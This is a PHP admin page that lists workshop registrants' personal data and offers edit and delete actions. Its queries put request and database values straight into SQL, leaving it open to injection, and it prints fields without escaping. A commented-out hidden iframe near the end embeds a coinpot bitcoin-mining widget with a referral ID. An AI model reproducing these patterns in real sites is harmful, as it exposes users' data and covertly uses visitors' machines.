<?php 
require_once "../functions/config.php";
$workshop_active = 'class="active"';
$reload = '<meta http-equiv="refresh" content="120">';
$title = 'Workshop';
require_once "header.php";
?>

        <div class="container container-body">
            
            <h1>Workshop</h1>
            
            <hr>
            
<?php
            
    if(!$_SESSION['admin']){
            
        echo '<div class="alert alert-danger">Anda harus login untuk membuka halaman ini.</div>';
            
    }else{

        if($data_admin['status'] != 1 && $data_admin['status'] != 2 && $data_admin['status'] != 6){
                
            echo '<div class="alert alert-danger">Anda tidak memiliki akses untuk membuka halaman ini.</div>';
        
        }else{

            if($data_admin['status'] == 1 OR $data_admin['pj_content']==5){

                if(isset($_GET['aksi']) == 'delete'){

                    $id = $_GET['id'];
                    $cek = $conn->query("SELECT * FROM workshop_parsial WHERE id='$id'");

                    if($cek->num_rows > 0){

                        $delete = $conn->query("DELETE FROM workshop_parsial WHERE id='$id'");
                        if($delete){
                            
                            echo '<div class="alert alert-success">Data berhasil dihapus.</div>';
                        }else{
                            echo '<div class="alert alert-info">Data gagal dihapus.</div>';
                        }
                    }
                }
            }else{
                
                $hidden= 'hidden';
            }
?>
        <div class="table-scroll">

            <table class="table table-responsive table-striped table-hover">
              
                <tr>
                    <th>NO.</th>
                    <th>TGL DAFTAR</th>
                    <th>NAMA</th>
                    <th>INSTANSI</th>
                    <th>ALAMAT</th>
                    <th>EMAIL</th>
                    <th>NO. HP</th>
                    <th>PEMBAYARAN</th>
                    <th <?php echo $hidden;?>>SETTING</th>
                </tr>
<?php
            $sql = $conn->query("SELECT * FROM workshop_parsial ORDER BY id");
            
            if($sql->num_rows > 0){
                $no = 1;
                
                while($row = $sql->fetch_assoc()){
                  
                    $email = $row['email'];
                    $sqlb = $conn->query("SELECT * FROM konfirmasi_pembayaran WHERE email='$email' AND nama_content='workshop'");
                    $rowb = $sqlb->fetch_assoc();
                    
                    if($sqlb->num_rows == 0){
                        
                        $row['pembayaran']='';
                    }

                    echo '
                <tr>
                    <td><center>'.$no.'</center></td>
                    <td>'.$row['tgl_daftar'].'</td>
                    <td>'.$row['nama'].'</td>
                    <td>'.$row['kampus_asal'].'</td>
                    <td>'.$row['alamat'].'</td>
                    <td>'.$row['email'].'</td>
                    <td>'.$row['no_hp'].'</td>
                    <td>
                        <a href="konfirmasi_pembayaran/workshop/'.$rowb['file_name'].'" title="Lihat Bukti Pembayaran">
                            <b class="lunas">'.$row['pembayaran'].'</b>
                        </a>
                    </td>';          
                    if($data_admin['status']==1 OR $data_admin['pj_content']==5){ 
                        echo
                    '
                    <td>
                        <a href="edit_data_workshop.php?id='.$row['id'].'" title="Ubah Data" class="btn btn-primary">
                            <span class="glyphicon glyphicon-edit" aria-hidden="true"></span> Edit
                        </a>
                    ';
                        if ($data_admin['status']==1) {

                            echo '
                    
                        <center><a href="?aksi=delete&id='.$row['id'].'" title="Hapus Data" class="btn btn-danger" onclick="return confirm(\'Yakin?\')">
                            <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>
                        </a></center>
                    </td>';
                        }
                    }
                        echo '
                </tr>
                ';
                  $no++;
                }
            }else{
                echo '<tr><td colspan="8">Tidak ada data</td></tr>';
            }
?>
            
            </table>
        </div>
<?php
        }
    }
?>

            <!--div hidden>
                <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=BE209166CB9B&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
            </div-->

<?php 
require_once "footer.php";
?>